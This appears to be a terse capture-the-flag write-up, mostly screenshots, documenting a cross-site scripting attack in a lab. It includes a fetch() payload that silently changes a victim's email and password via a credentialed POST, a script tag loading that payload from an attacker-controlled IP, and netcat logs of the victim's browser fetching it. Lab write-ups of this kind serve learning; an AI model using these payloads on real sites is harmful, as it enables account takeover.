
<img width="879" height="390" alt="image" src="https://github.com/user-attachments/assets/975dffd2-0a20-49e9-9e0f-971f665e26e3" />

<img width="693" height="252" alt="image" src="https://github.com/user-attachments/assets/0bb008ed-472e-4063-a2d8-70b7a0cb8eec" />



https://github.com/user-attachments/assets/1c84fe2e-7ebf-4b10-817b-6a3d726ef8b1


<img width="641" height="205" alt="image" src="https://github.com/user-attachments/assets/aea75bf6-7fb7-42f3-996c-05a29a473d8e" />

<img width="831" height="617" alt="image" src="https://github.com/user-attachments/assets/e95b006e-d2d9-40f0-bd97-14ee4457879d" />

<img width="368" height="76" alt="image" src="https://github.com/user-attachments/assets/40897b0b-4bc1-45c3-a78a-3f3d078680b6" />

<img width="604" height="359" alt="image" src="https://github.com/user-attachments/assets/951aede4-e61c-48c6-a736-cb064d96800a" />

``` javascript

fetch('/update_email.php', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type':'application/x-www-form-urlencoded'},
  body: 'email=pwned@evil.thm&password=hacked123'
});

```

<img width="636" height="207" alt="image" src="https://github.com/user-attachments/assets/12422b19-e836-4683-b7fb-a1229da8f3ea" />


``` javascript

<script src= "http://192.168.149.94:9090/script.js"></script>

```

``` bash

❯ ls
script.js
❯ cat script.js
fetch('/update_email.php', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type':'application/x-www-form-urlencoded'},
  body: 'email=pwned@evil.thm&password=hacked123'
});
❯ nc -lvnp 9090
listening on [any] 9090 ...

```


``` bash

❯ nc -lvnp 9090
listening on [any] 9090 ...
connect to [192.168.149.94] from (UNKNOWN) [192.168.149.94] 59934
GET /script.js HTTP/1.1
Host: 192.168.149.94:9090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: */*
Accept-Language: es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://10.112.159.136/


```

